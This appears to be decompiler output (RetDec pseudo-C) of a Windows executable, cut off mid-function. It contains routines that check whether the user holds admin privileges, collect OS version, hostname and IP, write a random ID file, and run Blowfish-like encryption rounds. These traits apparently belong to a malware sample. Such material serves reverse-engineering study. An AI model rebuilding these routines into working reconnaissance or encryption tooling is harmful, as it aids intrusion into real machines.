//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <netdb.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <windows.h>

// ---------------- Integer Types Definitions -----------------

typedef int64_t int128_t;

// ------------------------ Structures ------------------------

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _OSVERSIONINFOW {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int16_t e5[128];
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _WIN32_FIND_DATAW {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8[1];
    int16_t e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct in_addr {
    int32_t e0;
};

// ------------------------- Classes --------------------------

// .?AVBitmap@Gdiplus@@ (base classes: .?AVGdiplusBase@Gdiplus@@, .?AVImage@Gdiplus@@)
// .?AVGdiplusBase@Gdiplus@@
// .?AVImage@Gdiplus@@
// .?AVbad_alloc@std@@ (base classes: .?AVexception@std@@)
// .?AVbad_array_new_length@std@@ (base classes: .?AVexception@std@@, .?AVbad_alloc@std@@)
// .?AVexception@std@@
// .?AVtype_info@@

// ------------------- Function Prototypes --------------------

int32_t * _3f_try_get_function_40__40_YAPAXW4function_id_40__3f_A0x391cf84c_40__40_QBDQBW4module_id_40_2_40_2_40_Z(int32_t a1, char * a2, int32_t * a3, char * a4, int32_t a5, int32_t a6, int32_t a7);
int32_t ___except_validate_context_record(void);
int32_t _free(void);
int32_t _malloc(void);
int32_t function_404400(int32_t a1, int32_t a2, int32_t a3, int32_t * a4);
int32_t function_404410(char * a1);
int32_t function_404700(int32_t a1);
int32_t function_404740(void);
int32_t function_405f80(void);
int32_t function_4061e0(void);
int32_t function_406260(void);
int32_t function_406430(void);
int32_t function_406590(void);
int32_t function_406700(int32_t a1);
int32_t function_406b40(int32_t a1);
int32_t function_406f80(void);
int32_t function_4071a0(void);
int32_t function_408f50(void);
int32_t function_4091e0(void);
int32_t function_409260(void);
int32_t function_409b80(void);
int32_t function_409cc0(void);
int32_t function_409d80(void);
int32_t function_409f80(void);
int32_t function_40a030(void);
int32_t function_40a240(int32_t a1, int32_t * a2, int32_t a3);
int32_t function_40a4b0(void);
int32_t function_40a750(void);
int32_t function_40aa10(int32_t a1);
int32_t function_40b325(void);
int32_t function_40b44d(void);
void function_40b791(int32_t * ptr);
int32_t function_40c05f(void);
int32_t function_40e88c(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40e90b(int32_t a1);
int32_t function_40ee86(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_417754(int32_t a1);
int32_t function_4179ec(int32_t * lpSystemTimeAsFileTime, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);

// --------------------- Global Variables ---------------------

int32_t g1; // 0x425020
int32_t g2 = 9; // 0x425528
int32_t g3 = 46; // 0x42b2c0
int128_t g4; // 0x42c638
int128_t g5; // 0x42c648
int128_t g6; // 0x42c658
int32_t g7 = 0x404700; // 0x42c6a0
int128_t g8; // 0x42c740
int128_t g9; // 0x42c750
int128_t g10; // 0x42c7a0
int128_t g11; // 0x42c7b0
int128_t g12; // 0x42c7e0
int128_t g13; // 0x42c830
int128_t g14; // 0x42c890
int128_t g15; // 0x42c8b0
int128_t g16; // 0x42c8c0
int128_t g17; // 0x42c8f0
int128_t g18; // 0x42c900
int128_t g19; // 0x42c980
int128_t g20; // 0x42c990
int128_t g21; // 0x42c9b0
int128_t g22; // 0x42c9e0
int32_t g23 = -0x44bf19b2; // 0x42f008
int32_t g24; // 0x42f1b8
int32_t g25 = 0; // 0x42ff78
int32_t g26 = 0; // 0x4301a0
char * g27; // 0x4301f0
int32_t g28 = 0; // 0x431ff0
int32_t g29 = 0; // 0x431ff4
int32_t g30 = 0; // 0x431ff8
int32_t g31 = 0; // 0x431ffc
int32_t g32 = 0; // 0x432000
int32_t g33 = 0; // 0x432004
int32_t g34 = 0; // 0x432030
int32_t g35 = 0; // 0x433090
int32_t g36;

// ------------------------ Functions -------------------------

// Address range: 0x4043f0 - 0x4043f1
int32_t ___except_validate_context_record(void) {
    // 0x4043f0
    int32_t result; // 0x4043f0
    return result;
}

// Address range: 0x404400 - 0x404406
int32_t function_404400(int32_t a1, int32_t a2, int32_t a3, int32_t * a4) {
    // 0x404400
    return &g35;
}

// Address range: 0x404410 - 0x404444
int32_t function_404410(char * a1) {
    // 0x404410
    int32_t v1; // 0x404410
    int32_t v2; // 0x404410
    int32_t v3; // 0x404410
    int32_t v4 = ___acrt_iob_func(1, v1, v3, v2); // 0x40441d
    int32_t v5; // 0x404410
    int32_t v6 = function_404400(v4, (int32_t)a1, 0, &v5); // 0x40442d
    return ___stdio_common_vfprintf(*(int32_t *)v6, *(int32_t *)(v6 + 4));
}

// Address range: 0x404700 - 0x404740
// From class:    .?AVBitmap@Gdiplus@@
// Type:          virtual member function
int32_t function_404700(int32_t a1) {
    // 0x404700
    int32_t result; // 0x404700
    int32_t * v1 = (int32_t *)result; // 0x404709
    *v1 = (int32_t)&g7;
    GdipDisposeImage((int32_t *)*(int32_t *)(result + 4));
    if ((a1 & 1) == 0) {
        // 0x404739
        return result;
    }
    if ((a1 & 4) == 0) {
        // 0x404720
        GdipFree(v1);
        return result;
    }
    // 0x40472e
    ___except_validate_context_record();
    // 0x404739
    return result;
}

// Address range: 0x404740 - 0x40478c
// From class:    .?AVBitmap@Gdiplus@@
// Type:          virtual member function
int32_t function_404740(void) {
    int32_t v1 = 0; // bp-8, 0x404747
    int32_t v2; // 0x404740
    int32_t v3 = GdipCloneImage((int32_t *)*(int32_t *)(v2 + 4), (int32_t **)&v1); // 0x404755
    if (v3 != 0) {
        // 0x40475f
        *(int32_t *)(v2 + 8) = v3;
    }
    int32_t * v4 = GdipAlloc(16); // 0x404764
    if (v4 == NULL) {
        // 0x404785
        return 0;
    }
    int32_t result = (int32_t)v4; // 0x404764
    *v4 = (int32_t)&g7;
    *(int32_t *)(result + 4) = v1;
    *(int32_t *)(result + 8) = *(int32_t *)(v2 + 8);
    return result;
}

// Address range: 0x405f80 - 0x4061d5
int32_t function_405f80(void) {
    // 0x405f80
    int32_t lpBuffer; // bp-164, 0x405f80
    _memset(&lpBuffer, 0, 45);
    int32_t v1; // bp-115, 0x405f80
    _memset(&v1, 0, 99);
    int32_t lpFileName; // bp-216, 0x405f80
    _memset(&lpFileName, 0, 50);
    int32_t v2 = 0x35545039; // bp-116, 0x405fc5
    int32_t v3 = &v2; // 0x405fef
    int32_t v4 = v3; // 0x405ff2
    while (*(char *)v4 != 0) {
        // 0x405ff4
        v4++;
    }
    // 0x405ffb
    int32_t v5; // bp-217, 0x405f80
    int32_t v6 = &v5; // 0x406003
    v6++;
    char * v7 = (char *)v6;
    while (*v7 != 0) {
        // 0x406004
        v6++;
        v7 = (char *)v6;
    }
    uint32_t v8 = v4 - v3; // 0x406001
    uint32_t v9 = v8 / 4; // 0x406014
    __asm_rep_movsd_memcpy(v7, (char *)&v2, v9);
    bool v10; // 0x405f80
    int32_t v11 = v10 ? -4 : 4; // 0x406017
    char * v12 = (char *)(v6 + v9 * v11); // 0x406030
    __asm_rep_movsb_memcpy(v12, v12, v8 & 3);
    int32_t * fileHandle = CreateFileA((char *)&lpFileName, (int32_t)&g36, (int32_t)&g36, (struct _SECURITY_ATTRIBUTES *)&g36, (int32_t)&g36, (int32_t)&g36, &g36); // 0x406039
    int32_t lpNumberOfBytesRead; // bp-344, 0x405f80
    if (fileHandle != (int32_t *)-1) {
        // 0x40619f
        ReadFile(fileHandle, &lpBuffer, 40, &lpNumberOfBytesRead, NULL);
        CloseHandle(fileHandle);
        return _40___security_check_cookie_40_4();
    }
    int32_t * fileHandle2 = CreateFileA((char *)&lpFileName, 4, 1, NULL, 2, 128, NULL); // 0x40605d
    int32_t v13; // bp-67, 0x405f80
    _memset(&v13, 0, 49);
    int128_t v14; // 0x405f80
    __asm_movups_9(v14, __asm_movaps(g20));
    GetModuleHandleA("Advapi32.dll");
    function_4071a0();
    int32_t v15; // bp-336, 0x405f80
    int32_t v16 = &v15; // 0x4060bb
    while (*(char *)v16 != 0) {
        // 0x4060c0
        v16++;
    }
    // 0x4060c7
    int32_t v17; // bp-335, 0x405f80
    int32_t v18 = v16 - (int32_t)&v17; // 0x4060c7
    if (v18 != 0) {
        int32_t v19 = 0;
        int32_t v20; // bp-4, 0x405f80
        int32_t v21; // 0x405f80
        if (v19 != 0 && v19 != v18 - 1) {
            // 0x4060db
            v21 = v19 + (int32_t)&v20;
            *(char *)(v21 - 161) = *(char *)(v21 - 332);
        }
        int32_t v22 = v19 + 1; // 0x4060e9
        while (v22 != v18) {
            // 0x4060d0
            v19 = v22;
            if (v19 != 0 && v19 != v18 - 1) {
                // 0x4060db
                v21 = v19 + (int32_t)&v20;
                *(char *)(v21 - 161) = *(char *)(v21 - 332);
            }
            // 0x4060e9
            v22 = v19 + 1;
        }
    }
    // 0x4060ee
    _srand(GetTickCount());
    int32_t v23 = _rand(); // 0x4060fa
    int32_t v24 = 0; // bp-16, 0x40610c
    __itoa((int32_t)((0x100000000 * (int64_t)(v23 >> 31) | (int64_t)v23) % 0xc350) + 0x2710, (char *)&v24, 16);
    int32_t v25 = &v24; // 0x406124
    int32_t v26 = v25; // 0x40612c
    while (*(char *)v26 != 0) {
        // 0x406130
        v26++;
    }
    // 0x406137
    int32_t v27; // bp-165, 0x405f80
    int32_t v28 = &v27; // 0x40613f
    v28++;
    char * v29 = (char *)v28;
    while (*v29 != 0) {
        // 0x406140
        v28++;
        v29 = (char *)v28;
    }
    uint32_t v30 = v26 - v25; // 0x40613d
    uint32_t v31 = v30 / 4; // 0x40614a
    __asm_rep_movsd_memcpy(v29, (char *)&v24, v31);
    char * v32 = (char *)(v28 + v31 * v11); // 0x406154
    __asm_rep_movsb_memcpy(v32, v32, v30 & 3);
    int32_t v33 = &lpBuffer; // 0x40615f
    while (*(char *)v33 != 0) {
        // 0x406160
        v33++;
    }
    // 0x406167
    int32_t v34; // bp-163, 0x405f80
    WriteFile(fileHandle2, &lpBuffer, v33 - (int32_t)&v34, &lpNumberOfBytesRead, NULL);
    CloseHandle(fileHandle2);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x4061e0 - 0x40625a
int32_t function_4061e0(void) {
    // 0x4061e0
    int128_t v1; // 0x4061e0
    int128_t v2; // 0x4061e0
    __asm_movups_9(v2, __asm_xorps(v1, v1));
    GetModuleHandleA(NULL);
    __asm_movups_9(0, __asm_movaps(g15));
    function_4071a0();
    return _40___security_check_cookie_40_4();
}

// Address range: 0x406260 - 0x406427
int32_t function_406260(void) {
    // 0x406260
    int32_t v1; // bp-236, 0x406260
    _memset(&v1, 0, 200);
    int128_t v2; // 0x406260
    int128_t v3; // 0x406260
    __asm_movups_9(v3, __asm_xorps(v2, v2));
    function_4071a0();
    OpenProcess(0x1fffff, false, GetCurrentProcessId());
    GetModuleHandleA("Advapi32.dll");
    __asm_movups_9(71, __asm_movaps(0x6e656b6f54737365636f72506e65704f));
    function_4071a0();
    __asm_movups_9(71, __asm_movaps(0x74616d726f666e496e656b6f54746547));
    function_4071a0();
    int32_t v4; // 0x406260
    if (v4 != 0) {
        // 0x40637d
        function_404410("ok");
    }
    // 0x40638a
    LoadLibraryW(L"shell32.dll");
    GetModuleHandleW(L"shell32.dll");
    int32_t v5; // bp-237, 0x406260
    if (function_4071a0() == 0) {
        int32_t v6 = &v5; // 0x406406
        while (*(char *)(v6 + 1) != 0) {
            // 0x406407
            v6++;
        }
        // 0x406411
        return _40___security_check_cookie_40_4();
    }
    // 0x4063cb
    function_404410("user is admin");
    int32_t v7 = &v5; // 0x4063df
    while (*(char *)(v7 + 1) != 0) {
        // 0x4063e0
        v7++;
    }
    // 0x4063ea
    return _40___security_check_cookie_40_4();
}

// Address range: 0x406430 - 0x406589
int32_t function_406430(void) {
    // 0x406430
    int128_t v1; // 0x406430
    int128_t v2 = __asm_xorps(v1, v1); // 0x406456
    int128_t v3; // 0x406430
    __asm_movups_9(v3, v2);
    int32_t * v4 = NULL; // bp-16, 0x406464
    _memset(NULL, 0, (int32_t)&g36);
    int32_t lpVersionInformation = 276; // bp-332, 0x406477
    int128_t v5; // 0x406430
    __asm_movups_9(v5, __asm_xorps(v2, v2));
    int32_t * moduleHandle = GetModuleHandleA("kernel32.dll"); // 0x40649b
    char lpProcName = 71; // bp-36, 0x4064a4
    GetProcAddress(moduleHandle, &lpProcName);
    GetVersionExW((struct _OSVERSIONINFOW *)&lpVersionInformation);
    int32_t v6; // 0x406430
    __itoa(v6, (char *)&v4, 10);
    int32_t v7 = (int32_t)&v4; // 0x4064ea
    int32_t v8 = v7; // 0x4064f0
    while (*(char *)v8 != 0) {
        // 0x4064f2
        v8++;
    }
    // 0x4064f9
    int32_t v9; // bp-57, 0x406430
    int32_t v10 = &v9; // 0x4064fe
    int32_t v11 = v10; // 0x4064ff
    v11++;
    char * v12 = (char *)v11;
    while (*v12 != 0) {
        // 0x406500
        v11++;
        v12 = (char *)v11;
    }
    uint32_t v13 = v8 - v7; // 0x4064fc
    uint32_t v14 = v13 / 4; // 0x40650a
    __asm_rep_movsd_memcpy(v12, (char *)&v4, v14);
    bool v15; // 0x406430
    int32_t v16 = v15 ? -4 : 4; // 0x40650d
    char * v17 = (char *)(v11 + v14 * v16); // 0x406514
    __asm_rep_movsb_memcpy(v17, v17, v13 & 3);
    int32_t v18 = v10; // 0x40651a
    v18++;
    while (*(char *)v18 != 0) {
        // 0x406520
        v18++;
    }
    // 0x40652a
    *(int32_t *)v18 = 0x76696d;
    int32_t v19; // 0x406430
    __itoa(v19, (char *)&v4, 10);
    int32_t v20 = v7;
    int32_t v21 = v20 + 1; // 0x406552
    while (*(char *)v20 != 0) {
        // 0x406550
        v20 = v21;
        v21 = v20 + 1;
    }
    int32_t v22 = v10 + 1; // 0x406560
    char * v23 = (char *)v22;
    int32_t v24 = v22; // 0x406566
    while (*v23 != 0) {
        // 0x406560
        v22 = v24 + 1;
        v23 = (char *)v22;
        v24 = v22;
    }
    uint32_t v25 = v21 - v7; // 0x40655a
    uint32_t v26 = v25 / 4; // 0x40656d
    __asm_rep_movsd_memcpy(v23, (char *)&v4, v26);
    char * v27 = (char *)(v22 + v26 * v16); // 0x406577
    __asm_rep_movsb_memcpy(v27, v27, v25 & 3);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x406590 - 0x406604
int32_t function_406590(void) {
    struct in_addr in; // 0x4065f0
    // 0x406590
    int32_t name; // bp-88, 0x406590
    if (gethostname((char *)&name, 80) == -1) {
        // 0x4065b1
        return _40___security_check_cookie_40_4();
    }
    struct hostent * v1 = gethostbyname((char *)&name); // 0x4065c8
    if (v1 == NULL) {
        // 0x4065d2
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = *(int32_t *)*(int32_t *)((int32_t)v1 + 12); // 0x4065e8
    if (v2 != 0) {
        // 0x4065ee
        in = (struct {int32_t e0;}){
            .e0 = 0
        };
        in.e0 = *(int32_t *)v2;
        inet_ntoa(in);
    }
    // 0x4065f6
    return _40___security_check_cookie_40_4();
}

// Address range: 0x406700 - 0x406b37
int32_t function_406700(int32_t a1) {
    // 0x406700
    int32_t v1; // 0x406700
    unsigned char v2 = *(char *)(v1 + 1); // 0x406714
    unsigned char v3 = *(char *)(v1 + 2); // 0x40671d
    unsigned char v4 = *(char *)(v1 + 3); // 0x406726
    int32_t v5 = *(int32_t *)a1; // 0x40672f
    uint32_t v6 = (256 * (256 * (256 * v1 & 0xff00 | (int32_t)v2) | (int32_t)v3) | (int32_t)v4) ^ v5; // 0x40672f
    int32_t v7 = a1 + 1096; // 0x40673e
    int32_t v8 = *(int32_t *)((v6 / 0x4000 & 1020) + v7); // 0x40673e
    int32_t v9 = a1 + 72; // 0x406747
    int32_t v10 = *(int32_t *)(4 * v6 / 0x1000000 + v9); // 0x406747
    unsigned char v11 = *(char *)(v1 + 4); // 0x40674e
    int32_t v12 = a1 + 2120; // 0x406758
    int32_t v13 = *(int32_t *)((v6 / 64 & 1020) + v12); // 0x406758
    int32_t v14 = a1 + 3144; // 0x406762
    int32_t v15 = *(int32_t *)((4 * v6 & 1020) + v14); // 0x406762
    unsigned char v16 = *(char *)(v1 + 5); // 0x406769
    unsigned char v17 = *(char *)(v1 + 6); // 0x40676f
    unsigned char v18 = *(char *)(v1 + 7); // 0x406778
    int32_t v19 = *(int32_t *)(a1 + 4); // 0x406783
    uint32_t v20 = v19 ^ (v13 ^ v10 + v8) + v15 ^ (256 * (256 * (256 * (int32_t)v11 | (int32_t)v16) | (int32_t)v17) | (int32_t)v18); // 0x406783
    int32_t v21 = *(int32_t *)(4 * v20 / 0x1000000 + v9); // 0x40679d
    int32_t v22 = *(int32_t *)((v20 / 64 & 1020) + v12); // 0x4067ac
    int32_t v23 = *(int32_t *)((4 * v20 & 1020) + v14); // 0x4067b6
    int32_t v24 = *(int32_t *)(a1 + 8); // 0x4067bf
    uint32_t v25 = (v21 + *(int32_t *)((v20 / 0x4000 & 1020) + v7) ^ v22) + v23 ^ v6 ^ v24; // 0x4067c2
    int32_t v26 = *(int32_t *)(4 * v25 / 0x1000000 + v9); // 0x4067da
    int32_t v27 = *(int32_t *)(a1 + 12); // 0x4067de
    int32_t v28 = *(int32_t *)((v25 / 64 & 1020) + v12); // 0x4067e7
    int32_t v29 = *(int32_t *)((4 * v25 & 1020) + v14); // 0x4067f1
    uint32_t v30 = v27 ^ v20 ^ (v28 ^ v26 + *(int32_t *)((v25 / 0x4000 & 1020) + v7)) + v29; // 0x4067fb
    int32_t v31 = *(int32_t *)(4 * v30 / 0x1000000 + v9); // 0x406812
    int32_t v32 = *(int32_t *)((v30 / 64 & 1020) + v12); // 0x406821
    int32_t v33 = *(int32_t *)((4 * v30 & 1020) + v14); // 0x40682b
    int32_t v34 = *(int32_t *)(a1 + 16); // 0x406834
    uint32_t v35 = (v31 + *(int32_t *)((v30 / 0x4000 & 1020) + v7) ^ v32) + v33 ^ v25 ^ v34; // 0x406837
    int32_t v36 = *(int32_t *)(4 * v35 / 0x1000000 + v9); // 0x40684f
    int32_t v37 = *(int32_t *)(a1 + 20); // 0x406859
    int32_t v38 = *(int32_t *)((v35 / 64 & 1020) + v12); // 0x40685c
    int32_t v39 = *(int32_t *)((4 * v35 & 1020) + v14); // 0x406866
    uint32_t v40 = v37 ^ v30 ^ (v38 ^ v36 + *(int32_t *)((v35 / 0x4000 & 1020) + v7)) + v39; // 0x406870
    int32_t v41 = *(int32_t *)(4 * v40 / 0x1000000 + v9); // 0x406887
    int32_t v42 = *(int32_t *)((v40 / 64 & 1020) + v12); // 0x406896
    int32_t v43 = *(int32_t *)((4 * v40 & 1020) + v14); // 0x4068a0
    int32_t v44 = *(int32_t *)(a1 + 24); // 0x4068a9
    uint32_t v45 = (v41 + *(int32_t *)((v40 / 0x4000 & 1020) + v7) ^ v42) + v43 ^ v35 ^ v44; // 0x4068ac
    int32_t v46 = *(int32_t *)(4 * v45 / 0x1000000 + v9); // 0x4068c4
    int32_t v47 = *(int32_t *)(a1 + 28); // 0x4068c8
    int32_t v48 = *(int32_t *)((v45 / 64 & 1020) + v12); // 0x4068d1
    int32_t v49 = *(int32_t *)((4 * v45 & 1020) + v14); // 0x4068db
    uint32_t v50 = v47 ^ v40 ^ (v48 ^ v46 + *(int32_t *)((v45 / 0x4000 & 1020) + v7)) + v49; // 0x4068e5
    int32_t v51 = *(int32_t *)(4 * v50 / 0x1000000 + v9); // 0x4068fc
    int32_t v52 = *(int32_t *)((v50 / 64 & 1020) + v12); // 0x40690b
    int32_t v53 = *(int32_t *)((4 * v50 & 1020) + v14); // 0x406915
    int32_t v54 = *(int32_t *)(a1 + 32); // 0x40691e
    uint32_t v55 = (v51 + *(int32_t *)((v50 / 0x4000 & 1020) + v7) ^ v52) + v53 ^ v45 ^ v54; // 0x406921
    int32_t v56 = *(int32_t *)(4 * v55 / 0x1000000 + v9); // 0x40693f
    int32_t v57 = *(int32_t *)(a1 + 36); // 0x406943
    int32_t v58 = *(int32_t *)((v55 / 64 & 1020) + v12); // 0x406946
    int32_t v59 = *(int32_t *)((4 * v55 & 1020) + v14); // 0x406950
    uint32_t v60 = v57 ^ v50 ^ (v58 ^ v56 + *(int32_t *)((v55 / 0x4000 & 1020) + v7)) + v59; // 0x40695a
    int32_t v61 = *(int32_t *)(4 * v60 / 0x1000000 + v9); // 0x406971
    int32_t v62 = *(int32_t *)((v60 / 64 & 1020) + v12); // 0x406980
    int32_t v63 = *(int32_t *)((4 * v60 & 1020) + v14); // 0x40698a
    int32_t v64 = *(int32_t *)(a1 + 40); // 0x406993
    uint32_t v65 = (v61 + *(int32_t *)((v60 / 0x4000 & 1020) + v7) ^ v62) + v63 ^ v55 ^ v64; // 0x406996
    int32_t v66 = *(int32_t *)(4 * v65 / 0x1000000 + v9); // 0x4069ae
    int32_t v67 = *(int32_t *)(a1 + 44); // 0x4069b5
    int32_t v68 = *(int32_t *)((v65 / 64 & 1020) + v12); // 0x4069bb
    int32_t v69 = *(int32_t *)((4 * v65 & 1020) + v14); // 0x4069c5
    uint32_t v70 = v67 ^ v60 ^ (v68 ^ v66 + *(int32_t *)((v65 / 0x4000 & 1020) + v7)) + v69; // 0x4069cf
    int32_t v71 = *(int32_t *)(4 * v70 / 0x1000000 + v9); // 0x4069e6
    int32_t v72 = *(int32_t *)((v70 / 64 & 1020) + v12); // 0x4069f5
    int32_t v73 = *(int32_t *)((4 * v70 & 1020) + v14); // 0x4069ff
    int32_t v74 = *(int32_t *)(a1 + 48); // 0x406a08
    uint32_t v75 = (v71 + *(int32_t *)((v70 / 0x4000 & 1020) + v7) ^ v72) + v73 ^ v65 ^ v74; // 0x406a0b
    int32_t v76 = *(int32_t *)(4 * v75 / 0x1000000 + v9); // 0x406a23
    int32_t v77 = *(int32_t *)(a1 + 52); // 0x406a27
    int32_t v78 = *(int32_t *)((v75 / 64 & 1020) + v12); // 0x406a30
    int32_t v79 = *(int32_t *)((4 * v75 & 1020) + v14); // 0x406a3a
    uint32_t v80 = v77 ^ v70 ^ (v78 ^ v76 + *(int32_t *)((v75 / 0x4000 & 1020) + v7)) + v79; // 0x406a44
    int32_t v81 = *(int32_t *)(4 * v80 / 0x1000000 + v9); // 0x406a5b
    int32_t v82 = *(int32_t *)((v80 / 64 & 1020) + v12); // 0x406a6a
    int32_t v83 = *(int32_t *)((4 * v80 & 1020) + v14); // 0x406a74
    int32_t v84 = *(int32_t *)(a1 + 56); // 0x406a7d
    uint32_t v85 = (v81 + *(int32_t *)((v80 / 0x4000 & 1020) + v7) ^ v82) + v83 ^ v75 ^ v84; // 0x406a80
    int32_t v86 = *(int32_t *)((v85 / 0x4000 & 1020) + v7); // 0x406a92
    int32_t v87 = *(int32_t *)(4 * v85 / 0x1000000 + v9); // 0x406a9b
    int32_t v88 = *(int32_t *)(a1 + 60); // 0x406aaf
    int32_t v89 = *(int32_t *)((4 * v85 & 1020) + v14); // 0x406ab2
    uint32_t v90 = v88 ^ v80 ^ v89 + (v87 + v86 ^ *(int32_t *)((v85 / 64 & 1020) + v12)); // 0x406abc
    int32_t v91 = *(int32_t *)((v90 / 0x4000 & 1020) + v7); // 0x406acb
    int32_t v92 = *(int32_t *)(4 * v90 / 0x1000000 + v9); // 0x406ad4
    int32_t v93 = *(int32_t *)((v90 / 64 & 1020) + v12); // 0x406ae1
    uint32_t v94 = *(int32_t *)(a1 + 68) ^ v90; // 0x406aeb
    int32_t v95 = *(int32_t *)(a1 + 64); // 0x406af7
    uint32_t v96 = v95 ^ v85 ^ *(int32_t *)((4 * v90 & 1020) + v14) + (v92 + v91 ^ v93); // 0x406afa
    int32_t v97; // 0x406700
    *(char *)v97 = (char)(v94 / 0x1000000);
    *(char *)(v97 + 1) = (char)(v94 / 0x10000);
    *(char *)(v97 + 2) = (char)(v94 / 256);
    *(char *)(v97 + 4) = (char)(v96 / 0x1000000);
    *(char *)(v97 + 5) = (char)(v96 / 0x10000);
    uint32_t result = v96 / 256; // 0x406b25
    *(char *)(v97 + 3) = (char)v94;
    *(char *)(v97 + 6) = (char)result;
    *(char *)(v97 + 7) = (char)v96;
    return result;
}

// Address range: 0x406b40 - 0x406f77
int32_t function_406b40(int32_t a1) {
    // 0x406b40
    int32_t v1; // 0x406b40
    unsigned char v2 = *(char *)(v1 + 1); // 0x406b54
    unsigned char v3 = *(char *)(v1 + 2); // 0x406b5d
    unsigned char v4 = *(char *)(v1 + 3); // 0x406b66
    int32_t v5 = *(int32_t *)(a1 + 68); // 0x406b6f
    uint32_t v6 = (256 * (256 * (256 * v1 & 0xff00 | (int32_t)v2) | (int32_t)v3) | (int32_t)v4) ^ v5; // 0x406b6f
    int32_t v7 = a1 + 1096; // 0x406b7f
    int32_t v8 = *(int32_t *)((v6 / 0x4000 & 1020) + v7); // 0x406b7f
    int32_t v9 = a1 + 72; // 0x406b88
    int32_t v10 = *(int32_t *)(4 * v6 / 0x1000000 + v9); // 0x406b88
    unsigned char v11 = *(char *)(v1 + 4); // 0x406b8f
    int32_t v12 = a1 + 2120; // 0x406b99
    int32_t v13 = *(int32_t *)((v6 / 64 & 1020) + v12); // 0x406b99
    int32_t v14 = a1 + 3144; // 0x406ba3
    int32_t v15 = *(int32_t *)((4 * v6 & 1020) + v14); // 0x406ba3
    unsigned char v16 = *(char *)(v1 + 5); // 0x406baa
    unsigned char v17 = *(char *)(v1 + 6); // 0x406bb0
    unsigned char v18 = *(char *)(v1 + 7); // 0x406bb9
    int32_t v19 = *(int32_t *)(a1 + 64); // 0x406bc4
    uint32_t v20 = v19 ^ (v13 ^ v10 + v8) + v15 ^ (256 * (256 * (256 * (int32_t)v11 | (int32_t)v16) | (int32_t)v17) | (int32_t)v18); // 0x406bc4
    int32_t v21 = *(int32_t *)(4 * v20 / 0x1000000 + v9); // 0x406bde
    int32_t v22 = *(int32_t *)((v20 / 64 & 1020) + v12); // 0x406bed
    int32_t v23 = *(int32_t *)((4 * v20 & 1020) + v14); // 0x406bf7
    int32_t v24 = *(int32_t *)(a1 + 60); // 0x406c00
    uint32_t v25 = (v21 + *(int32_t *)((v20 / 0x4000 & 1020) + v7) ^ v22) + v23 ^ v6 ^ v24; // 0x406c03
    int32_t v26 = *(int32_t *)(4 * v25 / 0x1000000 + v9); // 0x406c1b
    int32_t v27 = *(int32_t *)(a1 + 56); // 0x406c1f
    int32_t v28 = *(int32_t *)((v25 / 64 & 1020) + v12); // 0x406c28
    int32_t v29 = *(int32_t *)((4 * v25 & 1020) + v14); // 0x406c32
    uint32_t v30 = v27 ^ v20 ^ (v28 ^ v26 + *(int32_t *)((v25 / 0x4000 & 1020) + v7)) + v29; // 0x406c3c
    int32_t v31 = *(int32_t *)(4 * v30 / 0x1000000 + v9); // 0x406c53
    int32_t v32 = *(int32_t *)((v30 / 64 & 1020) + v12); // 0x406c62
    int32_t v33 = *(int32_t *)((4 * v30 & 1020) + v14); // 0x406c6c
    int32_t v34 = *(int32_t *)(a1 + 52); // 0x406c75
    uint32_t v35 = (v31 + *(int32_t *)((v30 / 0x4000 & 1020) + v7) ^ v32) + v33 ^ v25 ^ v34; // 0x406c78
    int32_t v36 = *(int32_t *)(4 * v35 / 0x1000000 + v9); // 0x406c90
    int32_t v37 = *(int32_t *)(a1 + 48); // 0x406c9a
    int32_t v38 = *(int32_t *)((v35 / 64 & 1020) + v12); // 0x406c9d
    int32_t v39 = *(int32_t *)((4 * v35 & 1020) + v14); // 0x406ca7
    uint32_t v40 = v37 ^ v30 ^ (v38 ^ v36 + *(int32_t *)((v35 / 0x4000 & 1020) + v7)) + v39; // 0x406cb1
    int32_t v41 = *(int32_t *)(4 * v40 / 0x1000000 + v9); // 0x406cc8
    int32_t v42 = *(int32_t *)((v40 / 64 & 1020) + v12); // 0x406cd7
    int32_t v43 = *(int32_t *)((4 * v40 & 1020) + v14); // 0x406ce1
    int32_t v44 = *(int32_t *)(a1 + 44); // 0x406cea
    uint32_t v45 = (v41 + *(int32_t *)((v40 / 0x4000 & 1020) + v7) ^ v42) + v43 ^ v35 ^ v44; // 0x406ced
    int32_t v46 = *(int32_t *)(4 * v45 / 0x1000000 + v9); // 0x406d05
    int32_t v47 = *(int32_t *)(a1 + 40); // 0x406d09
    int32_t v48 = *(int32_t *)((v45 / 64 & 1020) + v12); // 0x406d12
    int32_t v49 = *(int32_t *)((4 * v45 & 1020) + v14); // 0x406d1c
    uint32_t v50 = v47 ^ v40 ^ (v48 ^ v46 + *(int32_t *)((v45 / 0x4000 & 1020) + v7)) + v49; // 0x406d26
    int32_t v51 = *(int32_t *)(4 * v50 / 0x1000000 + v9); // 0x406d3d
    int32_t v52 = *(int32_t *)((v50 / 64 & 1020) + v12); // 0x406d4c
    int32_t v53 = *(int32_t *)((4 * v50 & 1020) + v14); // 0x406d56
    int32_t v54 = *(int32_t *)(a1 + 36); // 0x406d5f
    uint32_t v55 = (v51 + *(int32_t *)((v50 / 0x4000 & 1020) + v7) ^ v52) + v53 ^ v45 ^ v54; // 0x406d62
    int32_t v56 = *(int32_t *)(4 * v55 / 0x1000000 + v9); // 0x406d80
    int32_t v57 = *(int32_t *)(a1 + 32); // 0x406d84
